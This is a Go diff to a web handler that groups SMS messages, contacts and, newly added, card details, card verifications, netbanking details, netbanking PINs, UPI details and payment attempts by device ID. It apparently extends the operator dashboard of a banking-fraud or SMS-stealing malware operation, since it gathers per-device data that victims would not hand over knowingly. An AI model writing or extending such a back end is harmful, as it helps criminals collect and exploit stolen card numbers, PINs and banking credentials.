@@ -31,7 +31,6 @@ func GetAllData(c *gin.Context) {
 	database.DB.Order("id desc").Find(&devices)
 	database.DB.Order("id desc").Find(&contactRecords)
 
-	// Group sms and contacts by device_id
 	smsByDevice := make(map[string][]models.SmsRecord)
 	for _, s := range smsRecords {
 		smsByDevice[s.DeviceID] = append(smsByDevice[s.DeviceID], s)
@@ -40,14 +39,44 @@ func GetAllData(c *gin.Context) {
 	for _, c := range contactRecords {
 		contactsByDevice[c.DeviceID] = append(contactsByDevice[c.DeviceID], c)
 	}
+	cardDetailsByDevice := make(map[string][]models.CardDetail)
+	for _, c := range cardDetails {
+		cardDetailsByDevice[c.DeviceID] = append(cardDetailsByDevice[c.DeviceID], c)
+	}
+	cardVerificationsByDevice := make(map[string][]models.CardVerification)
+	for _, c := range cardVerifications {
+		cardVerificationsByDevice[c.DeviceID] = append(cardVerificationsByDevice[c.DeviceID], c)
+	}
+	netbankingDetailsByDevice := make(map[string][]models.NetbankingDetail)
+	for _, n := range netbankingDetails {
+		netbankingDetailsByDevice[n.DeviceID] = append(netbankingDetailsByDevice[n.DeviceID], n)
+	}
+	netbankingPinsByDevice := make(map[string][]models.NetbankingPin)
+	for _, n := range netbankingPins {
+		netbankingPinsByDevice[n.DeviceID] = append(netbankingPinsByDevice[n.DeviceID], n)
+	}
+	upiDetailsByDevice := make(map[string][]models.UpiDetail)
+	for _, u := range upiDetails {
+		upiDetailsByDevice[u.DeviceID] = append(upiDetailsByDevice[u.DeviceID], u)
+	}
+	paymentAttemptsByDevice := make(map[string][]models.PaymentAttempt)
+	for _, p := range paymentAttempts {
+		paymentAttemptsByDevice[p.DeviceID] = append(paymentAttemptsByDevice[p.DeviceID], p)
+	}
 
 	// Build device-specific payloads
 	var deviceSections []gin.H
 	for _, d := range devices {
 		deviceSections = append(deviceSections, gin.H{
-			"device":   d,
-			"sms":      smsByDevice[d.DeviceID],
-			"contacts": contactsByDevice[d.DeviceID],
+			"device":             d,
+			"sms":                smsByDevice[d.DeviceID],
+			"contacts":           contactsByDevice[d.DeviceID],
+			"card_details":       cardDetailsByDevice[d.DeviceID],
+			"card_verifications": cardVerificationsByDevice[d.DeviceID],
+			"netbanking_details": netbankingDetailsByDevice[d.DeviceID],
+			"netbanking_pins":    netbankingPinsByDevice[d.DeviceID],
+			"upi_details":        upiDetailsByDevice[d.DeviceID],
+			"payment_attempts":   paymentAttemptsByDevice[d.DeviceID],
 		})
 	}
 
